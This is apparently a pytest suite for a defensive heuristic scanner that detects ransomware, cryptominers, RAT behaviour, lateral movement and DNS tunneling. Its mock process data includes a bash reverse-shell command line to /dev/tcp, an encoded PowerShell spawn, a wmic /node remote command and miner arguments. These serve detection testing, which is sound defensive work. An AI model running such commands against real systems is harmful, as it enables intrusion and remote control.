"""Tests for scanners.heuristic_scanner — Behavioral Heuristic Engine."""

from __future__ import annotations

import os
import time
from collections import namedtuple
from unittest.mock import patch, MagicMock, PropertyMock, call

import pytest

from core.config import AgentConfig, Severity
from scanners.heuristic_scanner import (
    HeuristicScanner,
    MINING_POOL_DOMAINS,
    MINING_CLI_PATTERNS,
    RANSOM_NOTE_NAMES,
    ENCRYPTED_EXTENSIONS,
    SUSPICIOUS_SPAWNS,
)


@pytest.fixture
def scanner():
    return HeuristicScanner(AgentConfig())


# Lightweight namedtuples to simulate psutil connection objects
_Addr = namedtuple("_Addr", ["ip", "port"])
_Conn = namedtuple("_Conn", ["raddr", "laddr", "status", "pid"])


def _make_process_mock(
    pid=1000,
    name="normal.exe",
    exe="C:\\Program Files\\App\\normal.exe",
    cmdline=None,
    cpu_percent=5.0,
    connections=None,
    parent=None,
    create_time=None,
):
    """Helper to build a mock psutil.Process-like object."""
    proc = MagicMock()
    proc.pid = pid
    proc.name.return_value = name
    proc.exe.return_value = exe
    proc.cmdline.return_value = cmdline or [exe]
    proc.info = {"pid": pid, "name": name, "cpu_percent": cpu_percent}

    # cpu_percent returns a float; the scanner calls it twice
    proc.cpu_percent.return_value = cpu_percent

    proc.net_connections.return_value = connections or []
    proc.parent.return_value = parent
    proc.create_time.return_value = create_time or (time.time() - 7200)

    return proc


# ======================================================================
# Properties
# ======================================================================


class TestHeuristicScannerProperties:

    def test_name(self, scanner):
        assert scanner.name == "HeuristicScanner"

    def test_description(self, scanner):
        assert "Behavioral" in scanner.description or "behavioral" in scanner.description

    def test_supported_platforms(self, scanner):
        assert "all" in scanner.supported_platforms


# ======================================================================
# Ransomware Detection
# ======================================================================


class TestRansomwareDetection:

    def test_ransom_note_found(self, scanner, tmp_path):
        """A file named HOW_TO_DECRYPT.txt should trigger CRITICAL."""
        note = tmp_path / "HOW_TO_DECRYPT.txt"
        note.write_text("Pay 1 BTC")

        with patch("scanners.heuristic_scanner.Path.home", return_value=tmp_path), \
             patch("scanners.heuristic_scanner.platform.system", return_value="Windows"):
            # Create Desktop/Documents so scanner finds them
            (tmp_path / "Desktop").mkdir(exist_ok=True)
            (tmp_path / "Documents").mkdir(exist_ok=True)
            # Put note in home root too
            findings = scanner._detect_ransomware()

        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical) >= 1
        assert any("ransom" in f.title.lower() for f in critical)
        # Evidence should contain the ransom note path
        assert any(
            any(str(note) == rn or note.name in rn for rn in f.evidence.get("ransom_notes", []))
            for f in critical
        )

    def test_no_ransom_notes(self, scanner, tmp_path):
        """A clean directory should produce no ransom note findings."""
        (tmp_path / "report.pdf").write_text("hello")
        (tmp_path / "Desktop").mkdir()
        (tmp_path / "Documents").mkdir()

        with patch("scanners.heuristic_scanner.Path.home", return_value=tmp_path), \
             patch("scanners.heuristic_scanner.platform.system", return_value="Windows"):
            findings = scanner._detect_ransomware()

        ransom_findings = [f for f in findings if "ransom" in f.title.lower()]
        assert len(ransom_findings) == 0

    def test_mass_encrypted_files(self, scanner, tmp_path):
        """More than 5 encrypted-extension files should trigger CRITICAL."""
        desktop = tmp_path / "Desktop"
        desktop.mkdir()
        (tmp_path / "Documents").mkdir()
        for i in range(10):
            (desktop / f"file{i}.encrypted").write_text("data")

        with patch("scanners.heuristic_scanner.Path.home", return_value=tmp_path), \
             patch("scanners.heuristic_scanner.platform.system", return_value="Windows"):
            findings = scanner._detect_ransomware()

        critical = [f for f in findings if f.severity == Severity.CRITICAL and "encrypt" in f.title.lower()]
        assert len(critical) >= 1
        ev = critical[0].evidence
        assert ev["encrypted_count"] == 10
        assert len(ev["sample_files"]) <= 10

    def test_few_encrypted_files(self, scanner, tmp_path):
        """Two encrypted files should NOT trigger the mass-encryption finding."""
        desktop = tmp_path / "Desktop"
        desktop.mkdir()
        (tmp_path / "Documents").mkdir()
        (desktop / "a.encrypted").write_text("data")
        (desktop / "b.encrypted").write_text("data")

        with patch("scanners.heuristic_scanner.Path.home", return_value=tmp_path), \
             patch("scanners.heuristic_scanner.platform.system", return_value="Windows"):
            findings = scanner._detect_ransomware()

        mass_findings = [f for f in findings if "mass" in f.title.lower() or "encrypt" in f.title.lower()]
        assert len(mass_findings) == 0

    def test_ransom_note_case_insensitive(self, scanner, tmp_path):
        """Ransom note matching should be case-insensitive."""
        (tmp_path / "Desktop").mkdir()
        (tmp_path / "Documents").mkdir()
        note = tmp_path / "decrypt_files.TXT"
        note.write_text("pay up")

        with patch("scanners.heuristic_scanner.Path.home", return_value=tmp_path), \
             patch("scanners.heuristic_scanner.platform.system", return_value="Linux"):
            findings = scanner._detect_ransomware()

        critical = [f for f in findings if f.severity == Severity.CRITICAL and "ransom" in f.title.lower()]
        assert len(critical) >= 1

    def test_multiple_ransom_notes(self, scanner, tmp_path):
        """Multiple ransom notes should all be listed in evidence."""
        (tmp_path / "Desktop").mkdir()
        (tmp_path / "Documents").mkdir()
        note1 = tmp_path / "HOW_TO_DECRYPT.txt"
        note2 = tmp_path / "RECOVER_FILES.html"
        note1.write_text("note1")
        note2.write_text("note2")

        with patch("scanners.heuristic_scanner.Path.home", return_value=tmp_path), \
             patch("scanners.heuristic_scanner.platform.system", return_value="Windows"):
            findings = scanner._detect_ransomware()

        critical = [f for f in findings if f.severity == Severity.CRITICAL and "ransom" in f.title.lower()]
        assert len(critical) >= 1
        paths = critical[0].evidence["ransom_notes"]
        assert len(paths) >= 2


# ======================================================================
# Cryptominer Detection
# ======================================================================


class TestCryptominerDetection:

    @patch("scanners.heuristic_scanner.time.sleep")
    @patch("scanners.heuristic_scanner.psutil")
    def test_high_cpu_with_mining_args(self, mock_psutil, mock_sleep, scanner):
        """Process at 90% CPU with mining CLI args should be HIGH."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        proc = _make_process_mock(
            pid=999, name="xmrig", cpu_percent=90.0,
            cmdline=["./xmrig", "--algo", "randomx", "--threads", "8"],
        )
        mock_psutil.process_iter.return_value = [proc]

        findings = scanner._detect_cryptominers()
        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1
        assert "mining" in high[0].evidence.get("mining_indicators", [""])[0].lower() or \
               "cli:" in high[0].evidence.get("mining_indicators", [""])[0]

    @patch("scanners.heuristic_scanner.time.sleep")
    @patch("scanners.heuristic_scanner.psutil")
    def test_high_cpu_no_mining_indicators(self, mock_psutil, mock_sleep, scanner):
        """Process at 90% CPU without mining indicators should be MEDIUM."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        proc = _make_process_mock(
            pid=500, name="python.exe", cpu_percent=95.0,
            cmdline=["python", "train_model.py"],
        )
        mock_psutil.process_iter.return_value = [proc]

        findings = scanner._detect_cryptominers()
        medium = [f for f in findings if f.severity == Severity.MEDIUM]
        assert len(medium) >= 1
        assert "CPU" in medium[0].title or "cpu" in medium[0].title.lower()

    @patch("scanners.heuristic_scanner.time.sleep")
    @patch("scanners.heuristic_scanner.psutil")
    def test_normal_cpu_ignored(self, mock_psutil, mock_sleep, scanner):
        """Process at 20% CPU should produce no finding."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        proc = _make_process_mock(pid=100, name="chrome.exe", cpu_percent=20.0)
        mock_psutil.process_iter.return_value = [proc]

        findings = scanner._detect_cryptominers()
        assert len(findings) == 0

    @patch("scanners.heuristic_scanner.time.sleep")
    @patch("scanners.heuristic_scanner.socket.gethostbyaddr")
    @patch("scanners.heuristic_scanner.psutil")
    def test_mining_pool_connection(self, mock_psutil, mock_dns, mock_sleep, scanner):
        """Process connected to a mining pool domain should be HIGH."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        conn = MagicMock()
        conn.raddr = _Addr(ip="1.2.3.4", port=3333)
        conn.status = "ESTABLISHED"

        proc = _make_process_mock(
            pid=800, name="hidden.exe", cpu_percent=85.0,
            cmdline=["hidden.exe"], connections=[conn],
        )
        mock_psutil.process_iter.return_value = [proc]
        mock_dns.return_value = ("pool.minexmr.com", [], ["1.2.3.4"])

        findings = scanner._detect_cryptominers()
        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1
        indicators = high[0].evidence.get("mining_indicators", [])
        assert any("pool" in ind for ind in indicators)

    @patch("scanners.heuristic_scanner.time.sleep")
    @patch("scanners.heuristic_scanner.psutil")
    def test_access_denied_handled(self, mock_psutil, mock_sleep, scanner):
        """AccessDenied during process iteration should not crash."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        proc = MagicMock()
        proc.cpu_percent.side_effect = mock_psutil.AccessDenied()
        proc.pid = 1
        mock_psutil.process_iter.return_value = [proc]

        findings = scanner._detect_cryptominers()
        assert isinstance(findings, list)

    @patch("scanners.heuristic_scanner.time.sleep")
    @patch("scanners.heuristic_scanner.psutil")
    def test_mining_cli_pattern_matching(self, mock_psutil, mock_sleep, scanner):
        """Each pattern in MINING_CLI_PATTERNS should be detected."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        for pattern in MINING_CLI_PATTERNS:
            proc = _make_process_mock(
                pid=42, name="miner", cpu_percent=95.0,
                cmdline=["miner", pattern],
            )
            mock_psutil.process_iter.return_value = [proc]

            findings = scanner._detect_cryptominers()
            high = [f for f in findings if f.severity == Severity.HIGH]
            assert len(high) >= 1, f"Pattern '{pattern}' was not detected"


# ======================================================================
# RAT Detection
# ======================================================================


class TestRATDetection:

    @patch("scanners.heuristic_scanner.psutil")
    def test_word_spawns_powershell(self, mock_psutil, scanner):
        """winword.exe spawning powershell.exe should be HIGH."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        parent = MagicMock()
        parent.name.return_value = "WINWORD.EXE"
        parent.pid = 100

        child = MagicMock()
        child.pid = 200
        child.name.return_value = "powershell.exe"
        child.parent.return_value = parent
        child.exe.return_value = "C:\\Windows\\System32\\powershell.exe"
        child.cmdline.return_value = ["powershell.exe", "-enc", "abc"]
        child.create_time.return_value = time.time() - 60
        child.net_connections.return_value = []
        child.info = {"pid": 200, "name": "powershell.exe", "create_time": time.time() - 60}

        mock_psutil.process_iter.return_value = [child]

        findings = scanner._detect_rat_behavior()
        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1
        assert any("powershell" in f.title.lower() or "winword" in f.title.lower() for f in high)

    @patch("scanners.heuristic_scanner.psutil")
    def test_normal_parent_child(self, mock_psutil, scanner):
        """Explorer spawning notepad should not trigger a finding."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        parent = MagicMock()
        parent.name.return_value = "explorer.exe"
        parent.pid = 50

        child = MagicMock()
        child.pid = 300
        child.name.return_value = "notepad.exe"
        child.parent.return_value = parent
        child.exe.return_value = "C:\\Windows\\notepad.exe"
        child.cmdline.return_value = ["notepad.exe"]
        child.create_time.return_value = time.time() - 7200
        child.net_connections.return_value = []
        child.info = {"pid": 300, "name": "notepad.exe", "create_time": time.time() - 7200}

        mock_psutil.process_iter.return_value = [child]
        mock_psutil.net_connections.return_value = []

        findings = scanner._detect_rat_behavior()
        high = [f for f in findings if f.severity in (Severity.HIGH, Severity.CRITICAL)]
        assert len(high) == 0

    @patch("scanners.heuristic_scanner.psutil")
    def test_reverse_shell_indicators(self, mock_psutil, scanner):
        """Bash with TCP connection and shell indicators should be CRITICAL."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        conn = MagicMock()
        conn.raddr = _Addr(ip="10.0.0.1", port=4444)
        conn.status = "ESTABLISHED"

        proc = MagicMock()
        proc.pid = 555
        proc.name.return_value = "bash"
        proc.exe.return_value = "/bin/bash"
        proc.cmdline.return_value = ["bash", "-i", ">&", "/dev/tcp/10.0.0.1/4444", "0>&1"]
        proc.create_time.return_value = time.time() - 120  # started 2 mins ago
        proc.net_connections.return_value = [conn]
        proc.parent.return_value = None
        proc.info = {"pid": 555, "name": "bash", "create_time": time.time() - 120}

        mock_psutil.process_iter.return_value = [proc]

        findings = scanner._detect_rat_behavior()
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical) >= 1
        assert any("reverse shell" in f.title.lower() or "shell" in f.title.lower() for f in critical)
        ev = critical[0].evidence
        assert ev["remote_ip"] == "10.0.0.1"
        assert ev["remote_port"] == 4444

    @patch("scanners.heuristic_scanner.psutil")
    def test_temp_process_outbound(self, mock_psutil, scanner):
        """Process from /tmp/ with outbound TCP connection should be HIGH."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        conn = MagicMock()
        conn.raddr = _Addr(ip="192.168.1.100", port=8080)
        conn.status = "ESTABLISHED"

        proc = MagicMock()
        proc.pid = 777
        proc.name.return_value = "dropper"
        proc.exe.return_value = "/tmp/dropper"
        proc.cmdline.return_value = ["/tmp/dropper"]
        proc.create_time.return_value = time.time() - 60
        proc.net_connections.return_value = [conn]
        proc.parent.return_value = None
        proc.info = {"pid": 777, "name": "dropper", "create_time": time.time() - 60}

        mock_psutil.process_iter.return_value = [proc]

        with patch("scanners.heuristic_scanner.platform.system", return_value="Linux"):
            findings = scanner._detect_rat_behavior()

        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1
        assert any("temp" in f.title.lower() or "Temp" in f.title for f in high)

    @patch("scanners.heuristic_scanner.psutil")
    def test_temp_process_no_connection(self, mock_psutil, scanner):
        """Process from /tmp/ without network connections should NOT trigger."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        proc = MagicMock()
        proc.pid = 888
        proc.name.return_value = "compiler"
        proc.exe.return_value = "/tmp/compiler"
        proc.cmdline.return_value = ["/tmp/compiler"]
        proc.create_time.return_value = time.time() - 60
        proc.net_connections.return_value = []
        proc.parent.return_value = None
        proc.info = {"pid": 888, "name": "compiler", "create_time": time.time() - 60}

        mock_psutil.process_iter.return_value = [proc]

        with patch("scanners.heuristic_scanner.platform.system", return_value="Linux"):
            findings = scanner._detect_rat_behavior()

        temp_findings = [f for f in findings if "temp" in f.title.lower() or "Temp" in f.title]
        assert len(temp_findings) == 0

    @patch("scanners.heuristic_scanner.psutil")
    def test_parent_access_denied(self, mock_psutil, scanner):
        """AccessDenied on parent lookup should not crash."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        proc = MagicMock()
        proc.pid = 400
        proc.name.return_value = "cmd.exe"
        proc.parent.side_effect = mock_psutil.AccessDenied()
        proc.exe.return_value = "C:\\Windows\\System32\\cmd.exe"
        proc.cmdline.return_value = ["cmd.exe"]
        proc.create_time.return_value = time.time() - 7200
        proc.net_connections.return_value = []
        proc.info = {"pid": 400, "name": "cmd.exe", "create_time": time.time() - 7200}

        mock_psutil.process_iter.return_value = [proc]

        # Should not raise
        findings = scanner._detect_rat_behavior()
        assert isinstance(findings, list)


# ======================================================================
# Lateral Movement Detection
# ======================================================================


class TestLateralMovement:

    @patch("scanners.heuristic_scanner.psutil")
    def test_smb_from_user_process(self, mock_psutil, scanner):
        """SMB connection (port 445) from a user process should be MEDIUM."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        conn = _Conn(
            raddr=_Addr(ip="10.0.0.5", port=445),
            laddr=_Addr(ip="10.0.0.1", port=49152),
            status="ESTABLISHED",
            pid=1234,
        )
        mock_psutil.net_connections.return_value = [conn]

        proc_mock = MagicMock()
        proc_mock.name.return_value = "explorer.exe"
        mock_psutil.Process.return_value = proc_mock

        # No PsExec or WMIC processes
        mock_psutil.process_iter.return_value = []

        findings = scanner._detect_lateral_movement()
        medium = [f for f in findings if f.severity == Severity.MEDIUM]
        assert len(medium) >= 1
        assert any("SMB" in f.title or "445" in f.title for f in medium)

    @patch("scanners.heuristic_scanner.psutil")
    def test_rdp_from_system_service(self, mock_psutil, scanner):
        """RDP (port 3389) from svchost.exe (system) should NOT trigger."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        conn = _Conn(
            raddr=_Addr(ip="10.0.0.5", port=3389),
            laddr=_Addr(ip="10.0.0.1", port=49153),
            status="ESTABLISHED",
            pid=800,
        )
        mock_psutil.net_connections.return_value = [conn]

        proc_mock = MagicMock()
        proc_mock.name.return_value = "svchost.exe"
        mock_psutil.Process.return_value = proc_mock

        mock_psutil.process_iter.return_value = []

        findings = scanner._detect_lateral_movement()
        # System service connections should be filtered out
        lateral_findings = [
            f for f in findings
            if f.severity == Severity.MEDIUM and "RDP" in f.evidence.get("protocol", "")
        ]
        assert len(lateral_findings) == 0

    @patch("scanners.heuristic_scanner.psutil")
    def test_psexec_detected(self, mock_psutil, scanner):
        """A process named psexesvc.exe should trigger HIGH."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        mock_psutil.net_connections.return_value = []

        proc = MagicMock()
        proc.pid = 600
        proc.name.return_value = "PSEXESVC.exe"
        proc.cmdline.return_value = ["PSEXESVC.exe"]
        proc.info = {"pid": 600, "name": "PSEXESVC.exe"}

        # The scanner iterates process_iter multiple times — once for PsExec
        # and once for WMIC. We return the same list for both calls.
        mock_psutil.process_iter.return_value = [proc]

        findings = scanner._detect_lateral_movement()
        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1
        assert any("psexec" in f.title.lower() for f in high)

    @patch("scanners.heuristic_scanner.psutil")
    def test_wmic_remote(self, mock_psutil, scanner):
        """Process with 'wmic /node:' in cmdline should trigger HIGH."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        mock_psutil.net_connections.return_value = []

        proc = MagicMock()
        proc.pid = 700
        proc.name.return_value = "wmic.exe"
        proc.cmdline.return_value = ["wmic", "/node:10.0.0.5", "process", "list"]
        proc.info = {"pid": 700, "name": "wmic.exe"}

        mock_psutil.process_iter.return_value = [proc]

        findings = scanner._detect_lateral_movement()
        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1
        assert any("wmic" in f.title.lower() for f in high)

    @patch("scanners.heuristic_scanner.psutil")
    def test_no_lateral_movement(self, mock_psutil, scanner):
        """Clean system with no lateral movement indicators."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        # No suspicious connections
        conn = _Conn(
            raddr=_Addr(ip="1.1.1.1", port=443),
            laddr=_Addr(ip="10.0.0.1", port=50000),
            status="ESTABLISHED",
            pid=100,
        )
        mock_psutil.net_connections.return_value = [conn]

        proc = MagicMock()
        proc.name.return_value = "chrome.exe"
        mock_psutil.Process.return_value = proc

        # No suspicious process names or cmdlines
        clean_proc = MagicMock()
        clean_proc.pid = 100
        clean_proc.name.return_value = "chrome.exe"
        clean_proc.cmdline.return_value = ["chrome.exe"]
        clean_proc.info = {"pid": 100, "name": "chrome.exe"}
        mock_psutil.process_iter.return_value = [clean_proc]

        findings = scanner._detect_lateral_movement()
        high = [f for f in findings if f.severity in (Severity.HIGH, Severity.CRITICAL)]
        assert len(high) == 0


# ======================================================================
# DNS Tunneling Detection
# ======================================================================


class TestDNSTunneling:

    @patch("scanners.heuristic_scanner.platform.system", return_value="Windows")
    @patch("scanners.heuristic_scanner.subprocess.run")
    def test_long_subdomain_detected(self, mock_run, mock_platform, scanner):
        """A DNS entry with a 60-char subdomain should trigger MEDIUM."""
        long_sub = "a" * 60
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout=(
                f"    Record Name . . . . . : {long_sub}.evil.com\n"
                f"    Record Type . . . . . : 1\n"
            ),
        )

        findings = scanner._detect_dns_tunneling()
        medium = [f for f in findings if f.severity == Severity.MEDIUM]
        assert len(medium) >= 1
        assert any("dns" in f.title.lower() or "tunnel" in f.title.lower() for f in medium)
        ev = medium[0].evidence
        assert ev["max_subdomain_length"] >= 60

    @patch("scanners.heuristic_scanner.platform.system", return_value="Windows")
    @patch("scanners.heuristic_scanner.subprocess.run")
    def test_normal_dns_cache(self, mock_run, mock_platform, scanner):
        """Normal DNS entries should produce no findings."""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout=(
                "    Record Name . . . . . : www.google.com\n"
                "    Record Type . . . . . : 1\n"
                "    Record Name . . . . . : github.com\n"
                "    Record Type . . . . . : 1\n"
            ),
        )

        findings = scanner._detect_dns_tunneling()
        assert len(findings) == 0

    @patch("scanners.heuristic_scanner.platform.system", return_value="Windows")
    @patch("scanners.heuristic_scanner.subprocess.run")
    def test_command_failure_handled(self, mock_run, mock_platform, scanner):
        """Subprocess failure should not crash the scanner."""
        mock_run.side_effect = FileNotFoundError("ipconfig not found")

        findings = scanner._detect_dns_tunneling()
        assert isinstance(findings, list)
        assert len(findings) == 0

    def test_dns_tunneling_constants(self, scanner):
        """Verify key constants are reasonable."""
        assert len(MINING_POOL_DOMAINS) > 10
        assert len(MINING_CLI_PATTERNS) > 5
        assert len(RANSOM_NOTE_NAMES) > 5
        assert len(ENCRYPTED_EXTENSIONS) > 5
        # All extensions should start with a dot
        for ext in ENCRYPTED_EXTENSIONS:
            assert ext.startswith(".")


# ======================================================================
# Full Scan Integration
# ======================================================================


class TestFullScan:

    def test_scan_calls_all_methods(self, scanner):
        """scan() should invoke all detection methods."""
        with patch.object(scanner, "_detect_ransomware", return_value=[]) as m1, \
             patch.object(scanner, "_detect_cryptominers", return_value=[]) as m2, \
             patch.object(scanner, "_detect_rat_behavior", return_value=[]) as m3, \
             patch.object(scanner, "_detect_lateral_movement", return_value=[]) as m4, \
             patch.object(scanner, "_detect_dns_tunneling", return_value=[]) as m5:
            result = scanner.scan()
            m1.assert_called_once()
            m2.assert_called_once()
            m3.assert_called_once()
            m4.assert_called_once()
            m5.assert_called_once()
            assert isinstance(result, list)

    @patch("scanners.heuristic_scanner.platform.system", return_value="Windows")
    @patch("scanners.heuristic_scanner.subprocess.run")
    @patch("scanners.heuristic_scanner.time.sleep")
    @patch("scanners.heuristic_scanner.psutil")
    def test_clean_system(self, mock_psutil, mock_sleep, mock_run, mock_platform, scanner, tmp_path):
        """A clean system should produce minimal or no findings."""
        mock_psutil.AccessDenied = type("AccessDenied", (Exception,), {})
        mock_psutil.NoSuchProcess = type("NoSuchProcess", (Exception,), {})

        # No high-CPU processes
        proc = _make_process_mock(pid=1, name="idle", cpu_percent=0.1)
        proc.parent.return_value = None
        proc.exe.return_value = "C:\\Windows\\System32\\idle.exe"
        proc.create_time.return_value = time.time() - 86400
        proc.net_connections.return_value = []
        mock_psutil.process_iter.return_value = [proc]

        # No lateral movement connections
        mock_psutil.net_connections.return_value = []

        # Normal DNS cache
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="    Record Name . . . . . : www.example.com\n",
        )

        # Clean filesystem
        (tmp_path / "Desktop").mkdir()
        (tmp_path / "Documents").mkdir()
        (tmp_path / "report.pdf").write_text("hello")

        with patch("scanners.heuristic_scanner.Path.home", return_value=tmp_path):
            findings = scanner.scan()

        critical_high = [f for f in findings if f.severity in (Severity.CRITICAL, Severity.HIGH)]
        assert len(critical_high) == 0
